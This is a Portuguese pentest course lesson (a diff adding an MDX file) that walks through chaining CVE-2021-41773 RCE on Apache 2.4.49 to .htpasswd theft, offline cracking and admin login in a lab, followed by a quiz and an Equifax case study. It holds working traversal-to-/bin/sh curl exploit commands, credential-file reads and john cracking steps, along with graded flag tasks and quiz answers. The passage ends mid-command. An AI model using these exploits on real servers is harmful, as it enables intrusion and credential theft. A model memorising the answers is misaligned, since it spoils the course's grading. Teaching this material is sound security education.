@@ -1,0 +1,517 @@
+---
+slug: mini-projeto-servicos
+track: trilha-5
+title: "Mini-projeto: comprometer um serviço ponta a ponta"
+prerequisites:
+  - enumeracao-de-servicos
+  - ataque-a-servicos
+  - metasploit
+  - cves-com-vulhub
+  - ataques-a-senhas
+lab: vulhub
+tasks:
+  - slug: reuso-de-credenciais
+    title: "Checkpoint — O reúso de credenciais que liga as duas vias"
+    type: flag
+    prompt: "Monte FLAG{senha-userA-userB}: a senha que aparece REPETIDA no .htpasswd do alvo e os dois usuários que a compartilham, em ordem alfabética, separados por hífen. Formato: FLAG{senha-userA-userB}."
+    hint: "O .htpasswd só é legível depois que o foothold (via CVE) te dá leitura no alvo. Jogue os três hashes no john; dois deles vão cair na MESMA senha. Essa senha e esses dois nomes de usuário (em ordem alfabética) montam a flag."
+    flag:
+      hash: "scrypt$16384$8$1$24c2765cff569e1d71a3e9013faa4014b613baf9e3d79d3716d6eac8cf8796e1"
+      salt: "7cb230eb2bec31724222038a9988cba8"
+  - slug: comprometimento-ponta-a-ponta
+    title: "Objetivo — Acesso confirmado e evidência registrada"
+    type: flag
+    prompt: "Monte FLAG{usuario-hash}: o usuário do sistema sob o qual o seu RCE executa (prova da via A) e os 12 PRIMEIROS caracteres do SHA-256 do /bin/sh do alvo, calculado NO PRÓPRIO alvo pelo foothold (a evidência de que você executou código através do shell). Formato: FLAG{usuario-hash}."
+    hint: "O usuário sai do `id` rodado pelo RCE. O hash sai de `sha256sum /bin/sh` executado pelo mesmo foothold (é o shell que a travessia chama). Pegue os 12 primeiros caracteres do hash."
+    flag:
+      hash: "scrypt$16384$8$1$6c8b7438c1aba3c49bcddf2d9080b786f733f1e3a2801f9e7539cff5da0c959e"
+      salt: "a5888fcf37b934b45f7ebb9c36cd56c8"
+  - slug: quiz-final
+    title: "Quiz — Comprometer um serviço ponta a ponta"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "No mini-projeto, as duas vias de acesso (a CVE e a senha fraca) parecem independentes, mas estão ligadas. Qual é o elo?"
+        options:
+          - "As duas usam a mesma porta, então contam como um único ataque"
+          - "O foothold obtido pela CVE (via A) permite ler o arquivo .htpasswd do alvo; quebrar esses hashes offline entrega justamente as credenciais da área /admin (via B). A saída de uma vira a entrada da outra"
+          - "A senha fraca é necessária para disparar a CVE"
+          - "Não há elo; são ataques totalmente separados que só por acaso atingem o mesmo host"
+        answer: 1
+        explanation: "É a essência do encadeamento: o RCE da via A te dá leitura no alvo, você saqueia o .htpasswd, quebra offline e descobre as senhas da via B. Duas falhas que, sozinhas, você trataria como achados separados se tornam uma cadeia onde uma alimenta a outra. A porta ser a mesma é irrelevante; a senha fraca não dispara a CVE."
+      - question: "Por que um pentester se dá ao trabalho de confirmar o acesso por DUAS vias independentes, se uma já bastaria para 'entrar'?"
+        options:
+          - "Para inflar o relatório com mais achados"
+          - "Porque cada via comprova um problema distinto com um impacto e uma correção próprios (a CVE pede patch; a senha fraca pede política de senha e MFA); e porque, se uma via for fechada, a outra ainda sustenta a demonstração do risco"
+          - "Porque a plataforma exige duas flags"
+          - "Porque uma via sempre é falso-positivo e a outra confirma"
+        answer: 1
+        explanation: "Duas vias não são redundância boba: são dois riscos diferentes, cada um com sua causa e sua defesa. O cliente precisa corrigir os dois. E demonstrar mais de um caminho mostra profundidade de exposição — fechar só o patch não resolve a senha fraca, e vice-versa."
+      - question: "O `id` do seu foothold devolve `uid=1(daemon)`. O que isso diz sobre o que você conquistou — e sobre o que falta?"
+        options:
+          - "Você é root; o serviço acabou"
+          - "Você executa comandos como a conta de serviço não privilegiada que roda o Apache. É um acesso real, mas limitado: ler/gravar onde o `daemon` pode. Virar root é o próximo passo (escalação de privilégio, Trilha 6)"
+          - "`daemon` é um usuário administrador do Linux"
+          - "O RCE falhou, porque não retornou root"
+        answer: 1
+        explanation: "Serviços bem configurados rodam como contas de baixo privilégio justamente para que um RCE não entregue a máquina inteira. `daemon` pode fazer estrago (ler o .htpasswd, por exemplo), mas não é root. Reconhecer esse teto é o que conecta este módulo à escalação de privilégio da trilha seguinte."
+      - question: "A defesa em profundidade deste alvo tem vários elos (patch, CGI, banner, senha, detecção). Por que o defensor está em vantagem estrutural sobre o atacante?"
+        options:
+          - "Porque o defensor tem mais dinheiro"
+          - "Porque o atacante precisa que TODOS os elos falhem para a cadeia completar, enquanto o defensor só precisa fechar UM para interrompê-la. Atualizar para a 2.4.51, OU desligar o CGI, OU usar senha forte — qualquer um já quebra o caminho"
+          - "Porque o atacante nunca conhece a topologia"
+          - "Porque a CVSS do atacante é sempre menor"
+        answer: 1
+        explanation: "Essa é a lógica de defense in depth: camadas independentes. A cadeia só vai do recon ao comprometimento se cada elo ceder. O defensor corta em qualquer ponto. Por isso vale ter várias camadas mesmo imperfeitas — não porque cada uma é perfeita, mas porque o atacante precisa vencer todas."
+      - question: "Durante um teste autorizado, por que você registra cada comando, horário e resposta (a cadeia de custódia da evidência) ENQUANTO ataca, e não só no fim?"
+        options:
+          - "Burocracia; o que importa é a flag"
+          - "Porque o valor do teste está no relatório reproduzível: a evidência datada prova o que foi feito e quando, permite ao cliente reproduzir e corrigir, delimita o que foi (e não foi) tocado, e protege você legalmente ao mostrar que ficou dentro do escopo"
+          - "Para acelerar o ataque"
+          - "Porque a plataforma apaga os comandos"
+        answer: 1
+        explanation: "Um comprometimento sem evidência é só uma história. A anotação datada (o que 1.5 chama de cadeia de custódia) transforma o ataque em prova: o cliente reproduz, corrige e confia. E, num engajamento real, é o que mostra que você agiu dentro do escopo autorizado — proteção sua, não burocracia."
+      - question: "O patch da CVE-2021-41773 saiu na 2.4.50, mas a recomendação deste módulo é atualizar para a 2.4.51. Por quê?"
+        options:
+          - "A 2.4.51 é só mais nova, sem diferença de segurança"
+          - "A 2.4.50 corrigiu de forma incompleta: ela barrou a travessia com `%2e`, mas a dupla codificação (`%%32%65`) ainda passava. Essa regressão virou a CVE-2021-42013, fechada só na 2.4.51"
+          - "A 2.4.51 desliga o CGI automaticamente"
+          - "A 2.4.50 não existe"
+        answer: 1
+        explanation: "É o caso clássico de correção incompleta (visto em 5.4): o primeiro patch tratou o sintoma óbvio e deixou um caminho equivalente. 'Atualizei' não é sempre 'corrigi' — e por isso a defesa confere a versão EXATA que fecha o buraco, a 2.4.51, não só 'a mais recente que eu tinha'."
+      - question: "Por que um ataque online com hydra contra o /admin é mais arriscado e lento que quebrar o .htpasswd offline depois do foothold?"
+        options:
+          - "O hydra não funciona contra HTTP Basic Auth"
+          - "O ataque online faz uma requisição por tentativa — é lento, barulhento nos logs e some se houver bloqueio de conta ou rate limiting; a quebra offline roda milhões de tentativas por segundo, localmente, sem tocar o alvo nem gerar um único log a mais"
+          - "A quebra offline não precisa do hash"
+          - "O hydra só testa uma senha por execução"
+        answer: 1
+        explanation: "Online, cada palpite é uma ida e volta na rede, visível e sujeita a lockout/rate limit. Offline, com o hash em mãos, a limitação é só o seu poder de CPU/GPU — por isso o foothold que entrega o .htpasswd é tão valioso: transforma um ataque lento e arriscado em um trabalho rápido e silencioso."
+glossary:
+  - term: attack path
+    definition: "O caminho concreto que o atacante percorreu de ponta a ponta num alvo — do primeiro acesso ao objetivo final — listando cada passo e cada falha explorada. É o esqueleto da história que o relatório de pentest conta, e o que o defensor precisa cortar."
+  - term: foothold
+    definition: "O primeiro ponto de execução conquistado dentro do alvo: o acesso inicial em que o atacante passa a rodar comandos (muitas vezes como uma conta de serviço de baixo privilégio). É a cabeça de ponte a partir da qual o resto do ataque avança."
+  - term: pivoting
+    definition: "Usar uma máquina já comprometida como trampolim para alcançar outras que não eram acessíveis de fora. O foothold vira o ponto de apoio para chegar à rede interna — o passo que leva do primeiro host ao resto do ambiente."
+---
+
+import caminhoDeAtaque from "./img/caminho-de-ataque.svg";
+import defesaEmProfundidade from "./img/defesa-em-profundidade.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Até aqui, cada módulo da Trilha 5 te deu uma ferramenta solta: enumerar um serviço (5.1), atacar uma configuração insegura (5.2), pilotar o Metasploit (5.3), reproduzir uma CVE (5.4), quebrar senhas (5.5). Num teste de intrusão real, ninguém te paga para usar uma técnica isolada — te pagam para **comprometer um alvo** e explicar **como**. E "como" quase nunca é uma falha só: é uma **sequência** de falhas, cada uma abrindo a porta da seguinte, do primeiro pacote de reconhecimento até o acesso que prova o risco. Este módulo é o mini-projeto que junta tudo: você vai pegar um único serviço e levá-lo do zero ao comprometimento, pelas suas próprias mãos, e vai sair com a parte que separa um curioso de um profissional — o <GlossaryTerm term="attack path">attack path</GlossaryTerm> (o caminho de ataque: cada passo documentado, do recon ao objetivo) e a **evidência** que o sustenta.
+
+O alvo é o mesmo Apache 2.4.49 dos módulos anteriores, mas agora você não recebe o roteiro pronto: recebe o objetivo. Vai descobrir a superfície, escolher por onde entrar, conquistar um <GlossaryTerm term="foothold">foothold</GlossaryTerm> (o acesso inicial, de onde se executa comando no alvo), saquear o que ele guarda, e confirmar o acesso por uma **segunda via independente** — provando que o mesmo serviço estava exposto por mais de um caminho. No fim, você vai ter duas flags que só se obtêm fazendo a cadeia inteira.
+
+**Ao final, você vai saber:**
+
+- conduzir um comprometimento de ponta a ponta contra um serviço, do reconhecimento ao acesso confirmado, decidindo cada passo a partir do que você descobre;
+- encadear falhas — usar a saída de uma (um foothold) como entrada da seguinte (o loot de credenciais) — e reconhecer por que o impacto de uma cadeia é maior que a soma das partes;
+- registrar o attack path e a evidência de cada etapa, no formato que um relatório de pentest exige;
+- enxergar o alvo pela ótica do defensor: quais camadas de defesa, sozinhas, teriam quebrado a cadeia.
+
+**Pré-requisitos** (tudo que você vai encadear aqui):
+
+- **5.1 — Enumeração de serviços:** mapear porta, versão, banner e a superfície exposta de um host.
+- **5.2 — Ataque a serviços comuns:** transformar uma má configuração em acesso inicial e saquear o serviço.
+- **5.3 — Metasploit Framework:** o fluxo `search → use → set → run`, que aqui aparece como alternativa ao ataque "na unha".
+- **5.4 — Explorando CVEs reais com Vulhub:** reproduzir a CVE-2021-41773 e entender a causa-raiz e a correção.
+- **5.5 — Ataques a senhas:** quebra offline de hashes, password spraying e reúso de credenciais.
+
+**Tempo estimado:** 3 a 4 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Este é um ataque completo: recon, exploração de uma CVE real, roubo de arquivo e quebra de credenciais. Só é legítimo porque o alvo é o laboratório isolado desta plataforma — seu, sem rede externa, descartável. A mesma sequência contra um host de terceiro, sem autorização por escrito, é crime no Brasil (Trilha 1), por mais "didática" que seja a intenção. O profissional se distingue não por saber atacar, mas por saber **onde** pode.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 O que é um engajamento ponta a ponta
+
+Um teste de intrusão não é um amontoado de ataques; é um processo com fases, e elas têm uma ordem porque cada uma **produz o que a próxima consome**. A forma mais simples de enxergar o ciclo:
+
+1. **Reconhecimento e <GlossaryTerm term="enumeration">enumeração</GlossaryTerm>** — descobrir o que existe e como está configurado. Sem isso, você ataca às cegas.
+2. **<GlossaryTerm term="initial access">Acesso inicial</GlossaryTerm>** — transformar uma falha em execução dentro do alvo (o foothold).
+3. **<GlossaryTerm term="post-exploitation">Pós-exploração</GlossaryTerm>** — a partir do foothold, saquear (credenciais, dados), escalar privilégio e, se o escopo pedir, <GlossaryTerm term="pivoting">pivotar</GlossaryTerm> (usar o host como trampolim para alcançar outros).
+
+Essa cadeia de fases tem nomes consagrados que você vai reencontrar em relatórios e em frameworks: a <GlossaryTerm term="Cyber Kill Chain">Cyber Kill Chain</GlossaryTerm> da Lockheed Martin e a <GlossaryTerm term="Unified Kill Chain">Unified Kill Chain</GlossaryTerm> descrevem exatamente essa progressão (vistas na Trilha 1). O mini-projeto é a kill chain em miniatura, num alvo só.
+
+A diferença entre um iniciante e um profissional não está em conhecer as fases — está em **deixar o que você descobre guiar o próximo passo**. Você não decide atacar a senha antes de saber que existe uma área autenticada; não escolhe a CVE antes de confirmar a versão. Cada achado abre ou fecha portas. É um fluxo de decisão, não um checklist cego.
+
+### 2.2 Attack path e exploit chain: a saída de um é a entrada do outro
+
+O conceito central deste módulo é o **encadeamento**. Uma <GlossaryTerm term="exploit chain">exploit chain</GlossaryTerm> (cadeia de exploração) é juntar várias vulnerabilidades, cada uma resolvendo uma pré-condição da próxima, de modo que falhas que isoladamente seriam médias, somadas, alcançam um objetivo que nenhuma delas atingiria sozinha. O attack path é o registro desse encadeamento: a lista ordenada de "fiz isto, que me deu aquilo, que usei para o próximo".
+
+No nosso alvo, isso fica concreto. Há três superfícies de ataque independentes:
+
+- uma **versão vulnerável** (Apache 2.4.49 → CVE-2021-41773, que vira RCE);
+- uma **área autenticada com senha fraca** (`/admin`, protegida por <GlossaryTerm term="HTTP Basic authentication">HTTP Basic authentication</GlossaryTerm> — o esquema em que o navegador manda usuário e senha a cada requisição);
+- **vazamento de informação** (banner de versão completo e um diretório `/internal` listável).
+
+Parecem três achados separados. O encadeamento os une: a CVE te dá um foothold; do foothold você lê o arquivo de senhas (`.htpasswd`) do próprio servidor; quebrando esses hashes offline, você descobre as senhas da área `/admin`. Ou seja, **a via da CVE entrega as credenciais da via da senha**. Duas portas que você trataria como achados isolados viram uma cadeia onde uma alimenta a outra — e o vazamento de informação foi o mapa que apontou as duas.
+
+<Figure
+  src={caminhoDeAtaque}
+  alt="Diagrama de fluxo da esquerda para a direita. Uma caixa de recon e enumeração (nmap, curl) descobre Apache 2.4.49, /internal, /admin e /cgi-bin, e se divide em duas vias. A via A, em cima, explora a CVE-2021-41773 (traversal no /cgi-bin chamando /bin/sh) e dá um foothold executando como daemon. Uma caixa no meio mostra o loot: o foothold lê o .htpasswd e o john quebra os hashes, revelando o reúso da senha password1. Uma seta verde tracejada 'entrega as senhas' liga esse loot à via B, embaixo, que é a senha fraca do /admin. As duas vias e o loot convergem numa caixa destacada em ciano: serviço comprometido ponta a ponta, com dois caminhos independentes e evidência registrada."
+  caption="O attack path do mini-projeto. Repare no elo verde: a via A (CVE) não só compromete o alvo — ela entrega as credenciais da via B (senha). É o encadeamento tornado visível."
+/>
+
+Por que isso importa tanto? Porque **o impacto de uma cadeia não é a soma das partes**. Uma senha fraca num painel interno é um achado médio; um RCE numa versão antiga é um achado alto. Juntos, com o RCE entregando as credenciais, você demonstra um comprometimento total do serviço com persistência de acesso — algo que muda a conversa com o cliente de "corrija quando puder" para "corrija agora".
+
+### 2.3 O foothold é um começo, não um fim
+
+Quando a CVE te dá execução de comando, é tentador declarar vitória. Mas o `id` do nosso foothold vai dizer `uid=1(daemon)`: você executa como a **conta de serviço** que roda o Apache, não como root. Isso é de propósito — serviços bem configurados rodam com <GlossaryTerm term="least privilege">menor privilégio</GlossaryTerm> justamente para que um RCE não entregue a máquina inteira. O `daemon` pode ler o `.htpasswd` (e isso já é ouro), mas não pode, por exemplo, ler `/etc/shadow` nem instalar um serviço.
+
+Esse teto é importante por duas razões. Primeiro, ele define o que você consegue saquear do foothold (e, portanto, o que a cadeia alcança). Segundo, ele é a porta de entrada da Trilha 6: pegar um acesso de baixo privilégio e transformá-lo em root é a **escalação de privilégio** — o capítulo seguinte da sua formação. Aqui, você para no foothold não privilegiado e documenta esse limite com honestidade.
+
+### 2.4 Evidência: o que separa um ataque de uma prova
+
+Um comprometimento sem registro é uma história sem testemunha. O produto de um pentest não é o acesso — é o **relatório reproduzível**. Por isso você anota, **enquanto ataca**, cada comando, horário e resposta: é a <GlossaryTerm term="chain of custody">chain of custody</GlossaryTerm> (cadeia de custódia) da evidência, vista em 1.5. Essa disciplina serve a três coisas ao mesmo tempo:
+
+- **Reproduzibilidade:** o cliente precisa refazer o passo para confirmar e corrigir. Um comando datado é reproduzível; "achei um jeito de entrar" não é.
+- **Delimitação:** o registro mostra exatamente o que você tocou (e o que não tocou), o que importa quando o alvo é um sistema de produção.
+- **Proteção legal:** num engajamento real, a evidência datada é o que prova que você ficou dentro do escopo autorizado. É defesa sua, não burocracia.
+
+No mini-projeto, a flag final é justamente uma peça de evidência: ela amarra a identidade do seu foothold (a via A) a um hash que só se calcula executando código no alvo. Produzir a flag **é** registrar a prova.
+
+## 3. Como o ataque funciona — a mecânica
+
+Vamos percorrer a cadeia inteira uma vez, com os comandos e as respostas reais do lab, para você entender a lógica antes de fazer sozinho na seção 5. Do Kali, o alvo responde em `http://vulhub/`.
+
+### 3.1 Recon: o que está aberto e qual versão
+
+Começa pelo mapa. Um <GlossaryTerm term="service detection">service detection</GlossaryTerm> do nmap mostra a porta, o serviço e a versão:
+
+```console
+$ nmap -Pn -sV vulhub
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+```
+
+Uma porta, um serviço, e — crucial — a versão exata: **Apache 2.4.49**. Essa linha é uma hipótese de CVE (você viu em 5.4 que a 2.4.49 é a única afetada pela CVE-2021-41773). Confirmar a versão pelos cabeçalhos da resposta também vaza um detalhe a mais:
+
+```console
+$ curl -sSI http://vulhub/
+HTTP/1.1 200 OK
+Server: Apache/2.4.49 (Unix)
+Content-Length: 45
+X-Backend-Config: /internal/
+Content-Type: text/html
+```
+
+Dois presentes do servidor mal configurado: o `Server:` entrega a versão cheia (um <GlossaryTerm term="ServerTokens">ServerTokens</GlossaryTerm> `Full`) e o cabeçalho `X-Backend-Config` vaza um caminho interno — `/internal/`. Isso é <GlossaryTerm term="information disclosure">information disclosure</GlossaryTerm>: o servidor contando ao atacante coisas que ele não precisava contar.
+
+### 3.2 Enumeração: seguir as pistas
+
+O caminho vazado é um convite. Como `/internal/` tem <GlossaryTerm term="directory listing">directory listing</GlossaryTerm> ligado, ele mostra seu conteúdo:
+
+```console
+$ curl -sS http://vulhub/internal/
+<h1>Index of /internal</h1>
+<li><a href="service-inventory.txt"> service-inventory.txt</a></li>
+
+$ curl -sS http://vulhub/internal/service-inventory.txt
+# internal service inventory (lab only; do not expose in production)
+host: vulhub
+service: apache-httpd
+role: legacy static content server
+owner: ops-team
+```
+
+E uma sondagem na área administrativa revela a segunda superfície — uma porta autenticada:
+
+```console
+$ curl -sSI http://vulhub/admin/
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Basic realm="Restricted Admin Area"
+```
+
+O `401` com `WWW-Authenticate: Basic` diz: aqui tem uma área protegida por HTTP Basic Auth. Guarde — é a via B. Agora você tem o mapa: uma versão vulnerável (via A) e uma área com senha (via B).
+
+### 3.3 Via A: da CVE ao foothold
+
+Você já dissecou essa CVE em 5.4; aqui ela é um meio, não o fim. A travessia aponta para `/bin/sh` sob o `ScriptAlias /cgi-bin/`, que faz o Apache **executar** o alvo em vez de lê-lo. O comando vai no corpo do `POST`:
+
+```console
+$ curl -sS --path-as-is \
+    -d 'echo Content-Type: text/plain; echo; id' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+Foothold conquistado. O `id` é a evidência: você executa comando no servidor, como `daemon`. (Lembre do `--path-as-is` de 5.4 — sem ele, o próprio `curl` desarma a travessia no cliente e você vê um `404` enganoso.)
+
+### 3.4 O elo: saquear o foothold para alimentar a via B
+
+Agora o encadeamento. Do foothold, você lê o arquivo de senhas que protege a área `/admin` — o `.htpasswd` do Apache:
+
+```console
+$ curl -sS --path-as-is \
+    -d 'echo Content-Type: text/plain; echo; cat /usr/local/apache2/conf/.htpasswd' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+admin:$apr1$L4b5x5Aa$bJXPX7bqGkv5VO0Ah8yIX.
+jsmith:$apr1$L4b5x5Bb$ZjBhI/CeFAbNgtz4CTabY.
+operator:$apr1$L4b5x5Cc$Ryjv33q1AzOM92nrTEjka.
+```
+
+Três contas, com hashes no formato APR1 (`$apr1$`, o MD5 com salt do Apache). Esses hashes não servem para fazer login — mas servem para a **quebra offline** de 5.5. Salve-os num arquivo no Kali e solte o john com a sua lista embutida (presente em qualquer Kali):
+
+```console
+$ john --format=md5crypt-long --wordlist=/usr/share/john/password.lst htpasswd.txt
+superman         (admin)
+password1        (jsmith)
+password1        (operator)
+3 password hashes cracked, 0 left
+```
+
+Aqui está o achado que amarra o mini-projeto: **`password1` aparece duas vezes** — `jsmith` e `operator` reusam a mesma senha. Reúso de credencial é o pão com manteiga do password spraying (5.5): uma senha descoberta abre várias contas. E a senha do `admin`, `superman`, é a chave da via B.
+
+### 3.5 Fechar a via B: login com a credencial quebrada
+
+A prova de que a via B é real: autenticar no `/admin` com o que você quebrou.
+
+```console
+$ curl -sS -o /dev/null -w 'HTTP %{http_code}\n' -u admin:superman http://vulhub/admin/
+HTTP 200
+$ curl -sS -o /dev/null -w 'HTTP %{http_code}\n' -u operator:password1 http://vulhub/admin/
+HTTP 200
+$ curl -sS -o /dev/null -w 'HTTP %{http_code}\n' -u admin:senhaerrada http://vulhub/admin/
+HTTP 401
+```
+
+`200` com a credencial certa, `401` com a errada. Você comprometeu o mesmo serviço por **duas vias independentes**: a CVE (via A) e a senha fraca (via B) — e a via A, de quebra, entregou a via B. É o attack path completo.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### Equifax (2017): a cadeia que vazou 145 milhões de pessoas
+
+Nenhum caso ilustra melhor o encadeamento deste módulo do que a invasão da **Equifax**, uma das maiores agências de crédito dos EUA, em 2017. O relatório oficial do **GAO** (Government Accountability Office, o órgão de auditoria do Congresso americano), o GAO-18-559, reconstrói a cadeia passo a passo — e ela é quase um espelho do nosso mini-projeto, só que em escala catastrófica.
+
+O acesso inicial veio de uma **CVE conhecida e não corrigida**: a CVE-2017-5638, no Apache Struts (um framework web Java), divulgada em **março de 2017** com patch disponível no mesmo dia (advisory S2-045, <GlossaryTerm term="CVSS">CVSS</GlossaryTerm> 10.0). A Equifax não aplicou o patch. Em **13 de maio de 2017**, atacantes exploraram a falha no portal de disputas de consumidores e confirmaram que podiam **executar comandos** — exatamente o foothold do nosso lab, em outro produto.
+
+O que aconteceu depois é o encadeamento. Nas palavras do GAO: a busca dos atacantes "levou a um repositório de dados contendo PII, **bem como nomes de usuário e senhas não criptografados** que podiam dar aos atacantes acesso a várias outras bases de dados da Equifax". Com essas credenciais saqueadas — igualzinho ao nosso `.htpasswd` lido pelo foothold — eles alcançaram **48 bases de dados adicionais** e rodaram **cerca de 9.000 consultas**, extraindo dados pessoais de **pelo menos 145,5 milhões de pessoas**.
+
+E a detecção? O ataque durou **cerca de 76 dias** sem ser notado. O motivo é uma aula de defesa: um dispositivo que deveria inspecionar o tráfego criptografado estava cego porque um **certificado digital havia expirado** — e estava expirado havia cerca de **10 meses**. Durante todo esse tempo, o tráfego dos atacantes passou sem inspeção.
+
+- **Impacto:** dados de ≥145,5 milhões de pessoas (nomes, CPFs americanos, datas de nascimento, endereços; em parte, carteiras de motorista e cartões). Descoberto em **29 de julho de 2017**.
+- **Lição:** a cadeia é idêntica à do mini-projeto — *CVE conhecida não corrigida → foothold com execução de comando → saque de credenciais em texto claro → acesso lateral a mais sistemas*. Cada elo, sozinho, teria quebrado a cadeia: aplicar o patch do Struts, não guardar senhas em claro no servidor, ou manter o certificado de inspeção válido para detectar a exfiltração.
+- **Fonte:** [GAO-18-559, *Data Protection: Actions Taken by Equifax and Federal Agencies in Response to the 2017 Breach* (agosto de 2018)](https://www.gao.gov/products/gao-18-559).
+
+### E a CVE do nosso lab também foi real
+
+A CVE-2021-41773, que você explora aqui, não é teoria: ela entrou no catálogo **CISA KEV** (Known Exploited Vulnerabilities) em **3 de novembro de 2021**, com prazo de correção em 17/11/2021 e marcação de uso conhecido em campanhas de ransomware — ou seja, explorada no mundo real contra quem não atualizou. Fonte: [CISA, Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** partindo só do endereço do alvo, você vai conduzir o comprometimento completo — recon, enumeração, foothold pela CVE, saque do `.htpasswd`, quebra offline e confirmação pela segunda via —, registrando o attack path. No caminho, duas flags: a primeira amarra o reúso de credenciais que liga as duas vias; a segunda é a evidência do acesso confirmado.
+
+Diferente dos módulos anteriores, aqui o roteiro afrouxa de propósito. O começo é guiado; do meio em diante, você recebe o objetivo e a direção, e monta os comandos. Abra as dicas só se travar.
+
+<Callout variant="tip" title="Antes de começar: abra um caderno">
+Este é um mini-projeto. Mantenha um arquivo aberto e cole, a cada passo, o comando que rodou, o horário e a resposta. No fim, esse caderno é o seu attack path — e é o hábito que a seção 2.4 cobra. A plataforma guarda as flags; o raciocínio, quem guarda é você.
+</Callout>
+
+### 5.1 Subir o laboratório (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. Aguarde o status virar *no ar*; o desktop do Kali abre embutido.
+2. No Kali, abra o terminal. O alvo é `http://vulhub/`, alcançável só de dentro do Kali, pela rede interna do lab (sem internet, sem acesso ao seu PC).
+3. Alternativa pelo terminal do WSL: `scripts/lab.sh up vulhub`.
+
+### 5.2 Recon guiado: a superfície
+
+Comece pelo mapa. Rode o service detection e confira a versão:
+
+```console
+$ nmap -Pn -sV vulhub
+```
+
+Você deve ver a porta 80 aberta e `Apache httpd 2.4.49`. Em seguida, olhe os cabeçalhos da página inicial com `curl -sSI http://vulhub/` e **leia cada linha**: o que o `Server:` entrega? Há algum cabeçalho fora do comum apontando um caminho?
+
+### 5.3 Desafio 1 — Mapear as duas superfícies
+
+Os cabeçalhos vazaram um caminho interno. Seu objetivo: a partir dele, descobrir o **inventário** que o servidor expõe e localizar uma **área autenticada**. Você deve terminar com duas coisas anotadas: o conteúdo de um arquivo de inventário e o endereço de uma área que responde pedindo usuário e senha.
+
+<Hint title="Dica 1">
+O cabeçalho `X-Backend-Config` aponta um diretório. Esse diretório está com listing ligado — acesse-o direto no navegador do Kali ou com `curl` e veja o que ele lista. Para a área autenticada, pense nos nomes óbvios de painel administrativo e veja qual responde `401`.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ curl -sS http://vulhub/internal/
+$ curl -sS http://vulhub/internal/service-inventory.txt
+$ curl -sSI http://vulhub/admin/
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Basic realm="Restricted Admin Area"
+```
+O `/internal/` lista um `service-inventory.txt`; o `/admin/` pede HTTP Basic Auth. Você tem o mapa: versão vulnerável (via A) e área com senha (via B).
+</Solution>
+
+### 5.4 Desafio 2 — Conquistar o foothold (via A)
+
+Você confirmou Apache 2.4.49. Seu objetivo: obter **execução de comando** no alvo e provar quem você é no sistema. É o ataque do módulo 5.4, agora como meio para um fim.
+
+<Hint title="Dica 1">
+A CVE-2021-41773 vira RCE porque o `/cgi-bin/` é um `ScriptAlias`: a travessia que chega ao `/bin/sh` faz o Apache **executá-lo**. Mande o comando no corpo de um `POST`. E não esqueça a opção que impede o `curl` de "consertar" o caminho no cliente.
+</Hint>
+
+<Hint title="Dica 2">
+O esqueleto é `curl -sS --path-as-is -d 'echo Content-Type: text/plain; echo; SEU_COMANDO' 'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'`. Comece com `id`.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ curl -sS --path-as-is \
+    -d 'echo Content-Type: text/plain; echo; id' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+Foothold como `daemon`. Anote: você executa comando no servidor. Esse `uid` é parte da flag final.
+</Solution>
+
+### 5.5 Desafio 3 — Saquear e quebrar: o reúso que liga as vias
+
+Agora o encadeamento. Do foothold, leia o arquivo que guarda as senhas da área `/admin`, salve os hashes no Kali e quebre-os offline. Seu objetivo: descobrir **a senha que aparece repetida** e **quais usuários a compartilham**.
+
+<Hint title="Dica 1">
+O arquivo de senhas do Apache fica em `/usr/local/apache2/conf/.htpasswd`. Use o mesmo RCE do desafio 2, trocando `id` por um `cat` desse arquivo. Copie as três linhas para um arquivo no Kali.
+</Hint>
+
+<Hint title="Dica 2">
+Os hashes começam com `$apr1$` — é o formato `md5crypt`. Quebre com `john --format=md5crypt-long --wordlist=/usr/share/john/password.lst SEU_ARQUIVO` e depois `john --show`. Compare as três senhas: duas são iguais.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ curl -sS --path-as-is \
+    -d 'echo Content-Type: text/plain; echo; cat /usr/local/apache2/conf/.htpasswd' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' > htpasswd.txt
+$ john --format=md5crypt-long --wordlist=/usr/share/john/password.lst htpasswd.txt
+$ john --show --format=md5crypt-long htpasswd.txt
+admin:superman
+jsmith:password1
+operator:password1
+```
+`password1` é reusada por `jsmith` e `operator`. Essa é a chave da primeira flag.
+</Solution>
+
+Com a senha repetida e os dois usuários que a compartilham (em ordem alfabética), monte a flag do checkpoint:
+
+<FlagInput task="reuso-de-credenciais" />
+
+### 5.6 Desafio 4 — Confirmar a via B e registrar a evidência
+
+Feche a cadeia. Primeiro, prove que a via B é real: autentique no `/admin` com uma credencial que você quebrou (confira que a senha certa dá `200` e uma errada dá `401`). Depois, produza a **evidência** da flag final: pelo foothold, descubra o usuário do sistema (já tem, do desafio 2) e calcule o `sha256` do `/bin/sh` do alvo — o próprio shell que a sua travessia executa.
+
+<Hint title="Dica 1">
+Login: `curl -u admin:superman http://vulhub/admin/`. Evidência: rode `sha256sum /bin/sh` pelo mesmo RCE do desafio 2 e pegue os 12 primeiros caracteres do hash.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ curl -sS -u admin:superman http://vulhub/admin/
+<h1>Restricted admin area</h1>
+$ curl -sS --path-as-is \
